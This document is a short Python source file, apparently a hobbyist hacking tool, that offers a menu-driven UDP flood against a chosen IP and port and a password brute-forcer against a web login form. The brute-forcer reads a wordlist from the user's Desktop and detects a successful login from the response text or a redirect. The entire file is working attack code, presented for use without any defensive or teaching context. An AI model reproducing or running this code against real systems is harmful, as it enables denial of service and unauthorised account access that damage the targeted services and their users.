import pyfiglet
import socket
import requests
import os

name = "MADE  BY ASURI"
ascii_art = pyfiglet.figlet_format(name)
print(ascii_art)

print("------------------------")
print("choose a tool to use: ")
print("------------------------")

print("1. dos attack")
print("2. brute force attack")
print("3. website dos (Soon)")

choice = int(input("choose a tool: "))

def dos_attack():
    target = input("Enter the target IP address: ").strip()
    port_input = input("Enter the target port: ").strip()

    if not port_input.isdigit():
        print("Error: Port must be a number!")
        exit()

    port = int(port_input)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"A" * 1024

    try:
        while True:
            sock.sendto(packet, (target, port))
            print(f"Packet Sent to {target}:{port}")
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"Error: {e}")


def brute_force_attack():
    url = input("Enter the login form URL: ").strip()
    username = input("Enter the username to test: ").strip()

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "passwords.txt")

    if not os.path.exists(desktop_path):
        print(f"[!] Error: File not found at {desktop_path}")
        return

    try:
        with open(desktop_path, "r", encoding="latin-1") as file:
            passwords = file.readlines()
    except Exception as e:
        print(f"[!] Could not read the file: {e}")
        return

    for password in passwords:
        password = password.strip()
        data = {"username": username, "password": password}

        try:
            response = requests.post(url, data=data)

            if "Invalid username" in response.text:
                print(f"[-] '{username}' is invalid.")
                break
            elif "Incorrect password" in response.text:
                print(f"[-] Incorrect: {password}")
            elif "Welcome" in response.text or "Dashboard" in response.text or response.status_code == 302:
                print(f"[+] SUCCESS! Password: {password}")
                break
            else:
                print(f"[?] Unknown response for: {password}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")
            continue

if choice == 1:
    dos_attack()
elif choice == 2:
    brute_force_attack()
else:
    print("Option not available.")
